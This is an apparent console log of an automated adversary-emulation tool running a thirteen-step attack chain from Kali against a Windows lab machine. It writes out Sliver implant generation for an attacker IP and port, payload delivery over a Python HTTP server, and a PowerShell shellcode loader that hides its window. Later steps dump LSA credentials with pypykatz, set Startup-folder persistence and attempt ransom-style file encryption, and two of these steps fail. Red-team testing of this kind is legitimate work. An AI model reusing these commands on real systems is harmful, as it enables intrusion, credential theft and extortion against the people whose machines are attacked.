@@ -1,0 +1,476 @@
+┌──(env_aurora-executor)─(kali㉿kali)-[~/Desktop/Aurora-executor-demo/run-20260715T033707Z-78114f34/chain-009]
+└─$ python attack_chain.py --params attack_chain.params.yml
+╭──────────────── Hello ────────────────╮
+│ 🎯 Welcome to Attack Execution Wizard │
+╰───────────── Let's Begin ─────────────╯
+
+📌[Sliver Console] Step 1
+
+📌[Name] Build Shellcode for the Sliver implant (for Windows)
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the attacker machine
+➤ Enter value for LHOST (current: '192.168.56.43' , required: True): 
+ Parameter Input
+  Parameter: LPORT
+  Description: listening port of the attacter machine
+➤ Enter value for LPORT (current: 8443 , required: True): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the generated payload
+➤ Enter value for SAVE_PATH (current: '/home/kali/Desktop/Aurora-executor-demo/sliver_save/chain_sc.bin' , required: True): 
+
+[Sliver Console] Commands to run (one per line, copy each separately):
+  sliver > generate --mtls 192.168.56.43:8443 --os windows --arch 64bit --format shellcode --save /home/kali/Desktop/Aurora-executor-demo/sliver_save/chain_sc.bin
+  sliver > mtls --lport 8443
+  ⚠ This step requires manual Sliver console interaction.
+Have you completed this Sliver console step? [y/n] (y): 
+
+📌[Human] Step 2
+
+📌[Name] Simulate the victim download a file on its machine
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the http file server (typically the attacker machine)
+➤ Enter value for LHOST (current: '192.168.56.43' , required: True): 
+ Parameter Input
+  Parameter: LPORT
+  Description: port of the http file server
+➤ Enter value for LPORT (current: 8000 , required: True): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the downloaded payload
+➤ Enter value for SAVE_PATH (current: 'C:\\Users\\Public\\chain_sc.bin' , required: True): 
+
+⚠ Human action required:
+╭───────────────────────────────────── Manual Step ──────────────────────────────────────╮
+│ (This step needs human interaction and (temporarily) cannot be executed automatically) │
+│ (On attacker's machine)                                                                │
+│ python -m http.server 8000                                                             │
+│                                                                                        │
+│ (On victim's machine)                                                                  │
+│ 1. Open 192.168.56.43:8000 in the browser                                              │
+│ 2. Navigate to the path of the file on the attacker's machine                          │
+│ 3. Download the file to C:\Users\Public\chain_sc.bin                                   │
+│                                                                                        │
+╰────────────────────────────────────────────────────────────────────────────────────────╯
+⏸  Have you completed this manual step? [y/n] (y): 
+
+📌[Human] Step 3
+
+📌[Name] Simulate the victim executes a shellcode payload (Windows)
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the downloaded shellcode payload file
+  ✓ Using stored value: C:\Users\Public\chain_sc.bin
+
+⚠ Human action required:
+╭─────────────────────────────────────────────────────────────────────── Manual Step ────────────────────────────────────────────────────────────────────────╮
+│ (This step needs human interaction and (temporarily) cannot be executed automatically)                                                                     │
+│ (On victim's machine, open a powershell and execute these scripts)                                                                                         │
+│                                                                                                                                                            │
+│ $s=[System.IO.File]::ReadAllBytes('C:\Users\Public\chain_sc.bin');                                                                                         │
+│ $c='using System;using System.Runtime.InteropServices;public class W{[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a,uint b,uint  │
+│ c,uint d);[DllImport("kernel32")]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);[DllImport("kernel32")]public │
+│ static extern uint WaitForSingleObject(IntPtr a,uint b);[DllImport("kernel32.dll")]public static extern IntPtr                                             │
+│ GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd,int nCmdShow);}';Add-Type -TypeDefinition                     │
+│ $c;$hwnd=[W]::GetConsoleWindow();if($hwnd -ne [IntPtr]::Zero){[W]::ShowWindow($hwnd,0)};                                                                   │
+│ $p=[W]::VirtualAlloc(0,$s.Length,0x3000,0x40);                                                                                                             │
+│ [System.Runtime.InteropServices.Marshal]::Copy($s,0,$p,$s.Length);                                                                                         │
+│ $h=[W]::CreateThread(0,0,$p,0,0,0);[W]::WaitForSingleObject($h,0xFFFFFFFF)                                                                                 │
+│                                                                                                                                                            │
+╰────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
+⏸  Have you completed this manual step? [y/n] (y): 
+
+📌[Session Check] Step 4
+📌[Name] Execute a Sliver Implant Payload
+[Session Check] Polling for new sliver session (30s)…
+  Previously known sessions: (none)
+  Newly detected session(s):
+    [95ec803b-0bc4-4add-9a52-8717a7c56ecc] KIND_CARTLOAD@WIN-BASE — WIN-BASE\useradmin (windows)
+➤ Session id to accept (default: 95ec803b-0bc4-4add-9a52-8717a7c56ecc, or 'n' to abort chain): 
+
+📌[Sliver Executor] Step 5
+
+📌[Name] Remote Processes List
+ Parameter Input
+  Parameter: executor
+  Description: The session ID of the active Sliver connection.
+Available Sessions:
+[0] 95ec803b-0bc4-4add-9a52-8717a7c56ecc - KIND_CARTLOAD@WIN-BASE - WIN-BASE\useradmin(windows)
+Select session number: 0
+
+[Sliver Executor] Executing: ps
+Keep going with the next attack step? [y/n] (y): 
+Listing processes on the remote system:
+PID: 0, Executable: [System Process]
+PID: 4, Executable: System
+PID: 100, Executable: Registry
+PID: 340, Executable: smss.exe
+PID: 436, Executable: csrss.exe
+PID: 520, Executable: csrss.exe
+PID: 540, Executable: wininit.exe
+PID: 576, Executable: winlogon.exe
+PID: 652, Executable: services.exe
+PID: 664, Executable: lsass.exe
+PID: 772, Executable: svchost.exe
+PID: 804, Executable: fontdrvhost.exe
+PID: 812, Executable: fontdrvhost.exe
+PID: 888, Executable: svchost.exe
+PID: 944, Executable: svchost.exe
+PID: 1008, Executable: dwm.exe
+PID: 480, Executable: svchost.exe
+PID: 8, Executable: svchost.exe
+PID: 1080, Executable: svchost.exe
+PID: 1088, Executable: svchost.exe
+PID: 1096, Executable: svchost.exe
+PID: 1224, Executable: VBoxService.exe
+PID: 1240, Executable: svchost.exe
+PID: 1280, Executable: svchost.exe
+PID: 1292, Executable: svchost.exe
+PID: 1364, Executable: svchost.exe
+PID: 1372, Executable: svchost.exe
+PID: 1380, Executable: svchost.exe
+PID: 1388, Executable: svchost.exe
+PID: 1432, Executable: svchost.exe
+PID: 1476, Executable: svchost.exe
+PID: 1580, Executable: svchost.exe
+PID: 1608, Executable: svchost.exe
+PID: 1616, Executable: svchost.exe
+PID: 1656, Executable: svchost.exe
+PID: 1704, Executable: svchost.exe
+PID: 1736, Executable: svchost.exe
+PID: 1744, Executable: svchost.exe
+PID: 1760, Executable: svchost.exe
+PID: 1900, Executable: svchost.exe
+PID: 1932, Executable: svchost.exe
+PID: 728, Executable: svchost.exe
+PID: 2052, Executable: svchost.exe
+PID: 2204, Executable: svchost.exe
+PID: 2308, Executable: spoolsv.exe
+PID: 2352, Executable: svchost.exe
+PID: 2360, Executable: svchost.exe
+PID: 2376, Executable: svchost.exe
+PID: 2440, Executable: svchost.exe
+PID: 2460, Executable: svchost.exe
+PID: 2480, Executable: svchost.exe
+PID: 2492, Executable: svchost.exe
+PID: 2520, Executable: svchost.exe
+PID: 2536, Executable: svchost.exe
+PID: 2552, Executable: svchost.exe
+PID: 2596, Executable: svchost.exe
+PID: 2620, Executable: sshd.exe
+PID: 2652, Executable: wlms.exe
+PID: 2860, Executable: svchost.exe
+PID: 1536, Executable: svchost.exe
+PID: 3128, Executable: svchost.exe
+PID: 3344, Executable: svchost.exe
+PID: 3516, Executable: AggregatorHost.exe
+PID: 4004, Executable: svchost.exe
+PID: 2448, Executable: sihost.exe
+PID: 3200, Executable: svchost.exe
+PID: 3272, Executable: svchost.exe
+PID: 3280, Executable: taskhostw.exe
+PID: 3788, Executable: svchost.exe
+PID: 3844, Executable: svchost.exe
+PID: 3712, Executable: ctfmon.exe
+PID: 3604, Executable: svchost.exe
+PID: 4168, Executable: svchost.exe
+PID: 4304, Executable: explorer.exe
+PID: 4412, Executable: svchost.exe
+PID: 2148, Executable: TextInputHost.exe
+PID: 512, Executable: StartMenuExperienceHost.exe
+PID: 476, Executable: svchost.exe
+PID: 5136, Executable: RuntimeBroker.exe
+PID: 5488, Executable: SearchApp.exe
+PID: 5544, Executable: RuntimeBroker.exe
+PID: 5356, Executable: RuntimeBroker.exe
+PID: 5432, Executable: VBoxTray.exe
+PID: 5348, Executable: svchost.exe
+PID: 2692, Executable: MicrosoftEdgeUpdate.exe
+PID: 3824, Executable: svchost.exe
+PID: 5068, Executable: svchost.exe
+PID: 5700, Executable: svchost.exe
+PID: 5448, Executable: msdtc.exe
+PID: 920, Executable: svchost.exe
+PID: 2824, Executable: svchost.exe
+PID: 3868, Executable: svchost.exe
+PID: 4276, Executable: ShellExperienceHost.exe
+PID: 4092, Executable: RuntimeBroker.exe
+PID: 3400, Executable: msedge.exe
+PID: 5520, Executable: msedge.exe
+PID: 5568, Executable: msedge.exe
+PID: 4312, Executable: msedge.exe
+PID: 740, Executable: msedge.exe
+PID: 4292, Executable: svchost.exe
+PID: 2136, Executable: msedge.exe
+PID: 3544, Executable: msedge.exe
+PID: 5104, Executable: msedge.exe
+PID: 5852, Executable: WmiPrvSE.exe
+PID: 2960, Executable: msedge.exe
+PID: 5212, Executable: msedge.exe
+PID: 4628, Executable: taskhostw.exe
+PID: 2728, Executable: svchost.exe
+PID: 2064, Executable: svchost.exe
+PID: 4548, Executable: svchost.exe
+PID: 2776, Executable: svchost.exe
+PID: 4496, Executable: ngentask.exe
+PID: 5796, Executable: conhost.exe
+PID: 4444, Executable: svchost.exe
+PID: 6764, Executable: ngen.exe
+PID: 4056, Executable: svchost.exe
+PID: 1524, Executable: MsMpEng.exe
+PID: 1032, Executable: svchost.exe
+PID: 6664, Executable: MpDefenderCoreService.exe
+PID: 2324, Executable: dllhost.exe
+PID: 6536, Executable: svchost.exe
+PID: 1508, Executable: svchost.exe
+PID: 2744, Executable: sshd-session.exe
+PID: 6056, Executable: sshd-session.exe
+PID: 2252, Executable: conhost.exe
+PID: 4088, Executable: cmd.exe
+PID: 6808, Executable: powershell.exe
+
+📌[Sliver Console] Step 6
+
+📌[Name] Build the executable file of a Sliver implant (for Windows)
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the attacker machine
+➤ Enter value for LHOST (current: '192.168.56.43' , required: True): 
+ Parameter Input
+  Parameter: LPORT
+  Description: listening port of the attacter machine
+➤ Enter value for LPORT (current: 8443 , required: True): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the generated payload
+➤ Enter value for SAVE_PATH (current: '/home/kali/Desktop/Aurora-executor-demo/sliver_save/chain_sc2.exe' , required: True): 
+
+[Sliver Console] Commands to run (one per line, copy each separately):
+  sliver > generate --mtls 192.168.56.43:8443 --os windows --arch 64bit --format exe --save /home/kali/Desktop/Aurora-executor-demo/sliver_save/chain_sc2.exe
+  sliver > mtls --lport 8443
+  ⚠ This step requires manual Sliver console interaction.
+Have you completed this Sliver console step? [y/n] (y): 
+
+📌[Human] Step 7
+
+📌[Name] Simulate the victim download and execute malicious payload file
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the http file server (typically the attacker machine)
+➤ Enter value for LHOST (current: '192.168.56.43' , required: True): 
+ Parameter Input
+  Parameter: LPORT
+  Description: port of the http file server
+➤ Enter value for LPORT (current: 8000 , required: True): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the downloaded payload
+➤ Enter value for SAVE_PATH (current: 'C:\\Users\\Public\\chain_sc2.exe' , required: True): 
+
+⚠ Human action required:
+╭───────────────────────────────────────────────────── Manual Step ─────────────────────────────────────────────────────╮
+│ (This step needs human interaction and (temporarily) cannot be executed automatically)                                │
+│ (On attacker's machine)                                                                                               │
+│ python -m http.server 8000                                                                                            │
+│                                                                                                                       │
+│ (On victim's machine)                                                                                                 │
+│ 1. Open 192.168.56.43:8000 in the browser                                                                             │
+│ 2. Navigate to the path of the target payload file                                                                    │
+│ 3. Download the payload file                                                                                          │
+│ 4. Execute the payload file to C:\Users\Public\chain_sc2.exe (If on a Linux machine, you also need to chmod the file) │
+│                                                                                                                       │
+╰───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
+⏸  Have you completed this manual step? [y/n] (y): 
+
+📌[Human] Step 8
+
+📌[Name] Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged executable as Admin
+ Parameter Input
+  Parameter: EXE_PATH
+  Description: Path of the executable the shortcut points at
+  ✓ Using stored value: C:\Users\Public\chain_sc2.exe
+
+⚠ Human action required:
+╭────────────────────────────────────────────────────── Manual Step ───────────────────────────────────────────────────────╮
+│ (This step needs human interaction and (temporarily) cannot be executed automatically)                                   │
+│ (On victim's machine, on the desktop or a folder)                                                                        │
+│ Right-click a shortcut (.lnk) whose target is:                                                                           │
+│ C:\Users\Public\chain_sc2.exe                                                                                            │
+│ then select "Run as administrator" (or open its Properties → Advanced → tick "Run as administrator", then double-click). │
+│                                                                                                                          │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
+⏸  Have you completed this manual step? [y/n] (y): 
+
+📌[Session Check] Step 9
+📌[Name] Execute a Sliver Implant Payload
+[Session Check] Polling for new sliver session (30s)…
+  Previously known sessions: ['95ec803b-0bc4-4add-9a52-8717a7c56ecc']
+  Newly detected session(s):
+    [7d5cfa56-f9b9-42b7-bf7f-5d9c21ea2953] PLEASANT_BAKERY@WIN-BASE — WIN-BASE\useradmin (windows)
+     PLEASANT_BAKERY@WIN-BASE — WIN-BASE\useradmin (windows)
+➤ Session id to accept (default: 7d5cfa56-f9b9-42b7-bf7f-5d9c21ea2953, or 'n' to abort chain): 
+
+📌[Sliver Session Derive] Step 10
+📌[Name] Execute PowerShell Command
+ Parameter Input
+  Parameter: executor_parent
+  Description: The session ID of the active Sliver connection.
+Available Sessions:
+[0] 95ec803b-0bc4-4add-9a52-8717a7c56ecc - KIND_CARTLOAD@WIN-BASE - WIN-BASE\useradmin(windows)
+[1] a5f01db2-05a1-4fbf-939c-82e45547d5ed - PLEASANT_BAKERY@WIN-BASE - WIN-BASE\useradmin(windows)
+[2] 7d5cfa56-f9b9-42b7-bf7f-5d9c21ea2953 - PLEASANT_BAKERY@WIN-BASE - WIN-BASE\useradmin(windows)
+Select session number: 2
+  ↳ Derived executor_derived executor from Sliver session 7d5cfa56-f9b9-42b7-bf7f-5d9c21ea2953
+
+📌[Powershell Executor] Step 11
+
+📌[Name] Registry parse with pypykatz
+ Parameter Input
+  Parameter: executor
+  Description: The Powershell session ID used to invoke pypykatz.
+  ✓ Using stored value: 7d5cfa56-f9b9-42b7-bf7f-5d9c21ea2953
+ Parameter Input
+  Parameter: venv_path
+  Description: Target-side path to a Python venv containing pypykatz.
+➤ Enter value for venv_path (current: 'C:\\Users\\Public\\venv_pypykatz' , required: True): 
+
+[Powershell Executor] PowerShell script to run via Sliver:
+  $venv = "C:\Users\Public\venv_pypykatz"
+if (-not (Test-Path "$venv\Scripts\pypykatz.exe")) {
+  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+  if (-not (Get-Command py -ErrorAction Ignore)) {
+    $pySetup = "$env:TEMP\python_setup.exe"
+    Invoke-WebRequest "https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe" -OutFile $pySetup
+    Start-Process $pySetup -ArgumentList '/quiet','InstallAllUsers=1','PrependPath=1' -Wait
+  }
+  py -m venv $venv
+  & "$venv\Scripts\pip.exe" install --no-cache-dir pypykatz | Out-Null
+}
+& "$venv\Scripts\pypykatz.exe" live lsa
+
+
+Run this script? [y/n] (y): 
+[Powershell Executor] Running…
+Executing PowerShell script via -EncodedCommand (647 bytes)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  ✗ Step 11 failed: Registry parse with pypykatz
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<AioRpcError of RPC that terminated with:
+        status = StatusCode.UNKNOWN
+        details = "implant timeout"
+        debug_error_string = "UNKNOWN:Error received from peer  {grpc_message:"implant timeout", grpc_status:2, 
+created_time:"2026-07-18T13:39:56.780645985-05:00"}"
+>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+
+📌[Powershell Executor] Step 12
+
+📌[Name] Add Executable Shortcut Link to User Startup Folder
+ Parameter Input
+  Parameter: executor
+  Description: The Powershell session ID used to create the .lnk file.
+  ✓ Using stored value: 7d5cfa56-f9b9-42b7-bf7f-5d9c21ea2953
+ Parameter Input
+  Parameter: target_path
+  Description: Full path to the executable the shortcut launches at login.
+➤ Enter value for target_path (current: 'C:\\Windows\\System32\\notepad.exe' , required: True): 
+ Parameter Input
+  Parameter: shortcut_name
+  Description: Filename of the .lnk placed under the Startup folder.
+➤ Enter value for shortcut_name (current: 'ArtPersist.lnk' , required: True): 
+
+[Powershell Executor] PowerShell script to run via Sliver:
+  $Target = "C:\Windows\System32\notepad.exe"
+$ShortcutLocation = "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ArtPersist.lnk"
+$WScriptShell = New-Object -ComObject WScript.Shell
+$Create = $WScriptShell.CreateShortcut($ShortcutLocation)
+$Create.TargetPath = $Target
+$Create.Save()
+
+
+Run this script? [y/n] (y): 
+[Powershell Executor] Running…
+Executing PowerShell script via -EncodedCommand (345 bytes)
+Status: 0
+Pid: 4796
+
+📌[Powershell Executor] Step 13
+
+📌[Name] Data Encrypted with GPG4Win
+ Parameter Input
+  Parameter: executor
+  Description: The Powershell session ID used to invoke gpg.exe.
+  ✓ Using stored value: 7d5cfa56-f9b9-42b7-bf7f-5d9c21ea2953
+ Parameter Input
+  Parameter: gpg_exe
+  Description: Full path to gpg.exe on target.
+➤ Enter value for gpg_exe (current: 'C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe' , required: True): 
+ Parameter Input
+  Parameter: file_to_encrypt
+  Description: Target-side path to the file GPG will encrypt.
+➤ Enter value for file_to_encrypt (current: 'C:\\Users\\Public\\gpg_test_target.txt' , required: True): 
+ Parameter Input
+  Parameter: passphrase
+  Description: Symmetric encryption passphrase (attacker keeps this to demand ransom).
+➤ Enter value for passphrase (current: 'AuroraPilotPass2026' , required: True): 
+
+[Powershell Executor] PowerShell script to run via Sliver:
+  if (-not (Test-Path "C:\Users\Public\gpg_test_target.txt")) {
+  Set-Content -Path "C:\Users\Public\gpg_test_target.txt" -Value "populating this file with some text"
+}
+& "C:\Program Files (x86)\GnuPG\bin\gpg.exe" --passphrase "AuroraPilotPass2026" --batch --yes -c "C:\Users\Public\gpg_test_target.txt"
+
+
+Run this script? [y/n] (y): 
+[Powershell Executor] Running…
+Executing PowerShell script via -EncodedCommand (344 bytes)
+Status: 1
+Pid: 6876
+Stderr:
+#< CLIXML
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">&amp; : The term 'C:\Program Files (x86)\GnuPG\bin\gpg.exe' is not recognized as the name of a cmdlet, function, script _x000D__x000A_</S><S S="Error">file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct _x000D__x000A_</S><S S="Error">and try again._x000D__x000A_</S><S S="Error">At line:5 char:3_x000D__x000A_</S><S S="Error">+ &amp; "C:\Program Files (x86)\GnuPG\bin\gpg.exe" --passphrase "AuroraPilo ..._x000D__x000A_</S><S S="Error">+   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~_x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (C:\Program Files (x86)\GnuPG\bin\gpg.exe:String) [], CommandNotFoundExc _x000D__x000A_</S><S S="Error">   eption_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : CommandNotFoundException_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  ✗ Step 13 failed: Data Encrypted with GPG4Win
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+PowerShell script exited with Status=1. See Stderr above for the failing line/statement.
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+
+══════════════════════════════════════════════════════════════════════
+  Attack Chain Run Summary
+══════════════════════════════════════════════════════════════════════
+Step  Name                                                                                  Start                    End                      Duration  Status
+   1  Build Shellcode for the Sliver implant (for Windows)                                  2026-07-18 18:24:18 UTC  2026-07-18 18:25:22 UTC     1m 3s    ✓   
+   2  Simulate the victim download a file on its machine                                    2026-07-18 18:25:22 UTC  2026-07-18 18:26:36 UTC    1m 14s    ✓   
+   3  Simulate the victim executes a shellcode payload (Windows)                            2026-07-18 18:26:36 UTC  2026-07-18 18:36:13 UTC    9m 37s    ✓   
+   4  Execute a Sliver Implant Payload                                                      2026-07-18 18:36:13 UTC  2026-07-18 18:36:14 UTC      1.2s    ✓   
+   5  Remote Processes List                                                                 2026-07-18 18:36:14 UTC  2026-07-18 18:36:17 UTC      2.7s    ✓   
+   6  Build the executable file of a Sliver implant (for Windows)                           2026-07-18 18:36:17 UTC  2026-07-18 18:37:37 UTC    1m 19s    ✓   
+   7  Simulate the victim download and execute malicious payload file                       2026-07-18 18:37:37 UTC  2026-07-18 18:38:18 UTC     41.0s    ✓   
+   8  Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged executable  2026-07-18 18:38:18 UTC  2026-07-18 18:38:55 UTC     37.6s    ✓   
+      as Admin                                                                                                                                                
+   9  Execute a Sliver Implant Payload                                                      2026-07-18 18:38:55 UTC  2026-07-18 18:39:00 UTC      5.2s    ✓   
+  10  Execute PowerShell Command                                                            2026-07-18 18:39:00 UTC  2026-07-18 18:39:22 UTC     21.7s    ✓   
+  11  Registry parse with pypykatz                                                          2026-07-18 18:39:22 UTC  2026-07-18 18:39:56 UTC     34.1s    ✗   
+  12  Add Executable Shortcut Link to User Startup Folder                                   2026-07-18 18:39:56 UTC  2026-07-18 18:40:05 UTC      9.2s    ✓   
+  13  Data Encrypted with GPG4Win                                                           2026-07-18 18:40:05 UTC  2026-07-18 18:40:10 UTC      4.7s    ✗   
+
+  Failed steps (2):
+  ✗ Step 11: Registry parse with pypykatz
+      <AioRpcError of RPC that terminated with:
+        status = StatusCode.UNKNOWN
+        details = "implant timeout"
+        debug_error_string = "UNKNOWN:Error received from peer  {grpc_message:"implant timeout", grpc_status:2, 
+created_time:"2026-07-18T13:39:56.780645985-05:00"}"
+      >
+  ✗ Step 13: Data Encrypted with GPG4Win
+      PowerShell script exited with Status=1. See Stderr above for the failing line/statement.
+
+  Total: 13 steps executed (11 ✓, 0 ?, 2 ✗) in 15m 51s
+══════════════════════════════════════════════════════════════════════
